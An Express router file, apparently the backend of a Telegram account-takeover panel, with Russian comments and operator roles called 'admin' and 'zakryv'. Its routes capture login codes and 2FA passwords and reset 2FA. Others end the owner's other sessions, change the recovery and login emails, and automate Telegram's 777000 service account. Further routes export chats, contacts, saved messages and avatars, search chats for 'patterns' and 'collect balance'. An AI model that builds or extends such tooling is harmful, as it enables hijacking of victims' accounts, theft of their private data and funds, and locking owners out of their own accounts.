import { Router } from 'express';
import { authenticate } from '../../middleware/auth.middleware';
import { authorize } from '../../middleware/auth.middleware';
import { requireAdminOrZakryv } from '../../middleware/role.middleware';
import { asyncHandler } from '../../utils/asyncHandler';
import {
    checkConnection,
    sendCode,
    verifyCode,
    verifyPassword,
    getAllSessions,
    getSessionById,
    deleteSession,
    getSessionHistory,
    resendPhoneCode,
    sendEmailCode,
    verifyEmailCode,
    resendEmailCode,
    resetTwoFactor,
    changeTwoFactorPassword,
    downloadExport,
    // Katka controls
    showUserInfo,
    exportContactsCsv,
    terminateOtherSessions,
    exportChatsJson,
    exportSavedMessages,
    exportDialogWithUser,
    check2FAStatus,
    automate777000,
    autoChangeLoginEmail,
    setOrUpdate2FAEmail,
    changeLoginEmailSend,
    changeLoginEmailVerify,
    getSessionMetrics,
    exportPatterns,
    exportAvatar,
    collectBalance,
    exportContactsWithPhotos,
    getPatternsIndex,
    getPatternBundle
} from '../controllers/telegram.controller';

const router = Router();

router.use(authenticate);

// Проверка соединения с Telegram API
router.get('/check-connection', asyncHandler(checkConnection));

// Отправка кода авторизации
router.post('/send-code', asyncHandler(sendCode));
// Повторная отправка кода на телефон (SMS или Telegram)
router.post('/resend-phone-code', asyncHandler(resendPhoneCode));

// Верификация кода
router.post('/verify-code', asyncHandler(verifyCode));

// Верификация пароля 2FA
router.post('/verify-password', asyncHandler(verifyPassword));

// Email verification flow (заглушки / частично реализовано)
router.post('/send-email-code', asyncHandler(sendEmailCode));
router.post('/verify-email-code', asyncHandler(verifyEmailCode));
router.post('/resend-email-code', asyncHandler(resendEmailCode));

// 2FA reset & change password endpoints
router.post('/reset-2fa', asyncHandler(resetTwoFactor));
router.post('/change-2fa-password', asyncHandler(changeTwoFactorPassword));

// Получение всех сессий (только для zakryv и admin)
router.get('/sessions', asyncHandler(getAllSessions));

// Получение сессии по ID
router.get('/sessions/:id', asyncHandler(getSessionById));

// Удаление сессии
router.delete('/sessions/:id', asyncHandler(deleteSession));

// История действий с сессией
router.get('/sessions/:id/history', asyncHandler(getSessionHistory));

// Скачивание экспортированных файлов (доступ только admin/zakryv)
router.get(
    '/exports/:sessionId/:fileName',
    requireAdminOrZakryv,
    asyncHandler(downloadExport)
);

// -------- Katka control routes (admin|zakryv) --------
router.get('/katka/user-info', requireAdminOrZakryv, asyncHandler(showUserInfo));
router.post('/katka/export-contacts', requireAdminOrZakryv, asyncHandler(exportContactsCsv));
router.post('/katka/terminate-other-sessions', requireAdminOrZakryv, asyncHandler(terminateOtherSessions));
router.post('/katka/export-chats', requireAdminOrZakryv, asyncHandler(exportChatsJson));
router.post('/katka/export-saved', requireAdminOrZakryv, asyncHandler(exportSavedMessages));
router.post('/katka/export-dialog', requireAdminOrZakryv, asyncHandler(exportDialogWithUser));
router.get('/katka/:phone/check-2fa', requireAdminOrZakryv, asyncHandler(check2FAStatus));
router.post('/katka/automate-777000', requireAdminOrZakryv, asyncHandler(automate777000));
router.post('/katka/set-or-update-2fa-email', requireAdminOrZakryv, asyncHandler(setOrUpdate2FAEmail));
router.post('/katka/change-login-email/send', requireAdminOrZakryv, asyncHandler(changeLoginEmailSend));
router.post('/katka/change-login-email/verify', requireAdminOrZakryv, asyncHandler(changeLoginEmailVerify));
router.post('/katka/auto-change-login-email', requireAdminOrZakryv, asyncHandler(autoChangeLoginEmail));
router.get('/katka/:phone/metrics', requireAdminOrZakryv, asyncHandler(getSessionMetrics));
// login email status
import { getLoginEmailStatus, getLastExports } from '../controllers/telegram.controller';
router.get('/katka/:phone/login-email-status', requireAdminOrZakryv, asyncHandler(getLoginEmailStatus));
router.get('/katka/:phone/last-exports', requireAdminOrZakryv, asyncHandler(getLastExports));
// session.log tail
import { getSessionLog } from '../controllers/telegram.controller';
router.get('/katka/:phone/session-log', requireAdminOrZakryv, asyncHandler(getSessionLog));
// Newly added Katka feature routes (patterns, avatar, balance, contacts+photos)
router.post('/katka/patterns', requireAdminOrZakryv, asyncHandler(exportPatterns));
router.post('/katka/avatar', requireAdminOrZakryv, asyncHandler(exportAvatar));
router.post('/katka/balance', requireAdminOrZakryv, asyncHandler(collectBalance));
router.post('/katka/export-contacts-photos', requireAdminOrZakryv, asyncHandler(exportContactsWithPhotos));
// Patterns extended UI endpoints
router.get('/katka/:phone/patterns-index', requireAdminOrZakryv, asyncHandler(getPatternsIndex));
router.get('/katka/:phone/patterns-bundle/:chatId/:matchId', requireAdminOrZakryv, asyncHandler(getPatternBundle));

export default router;
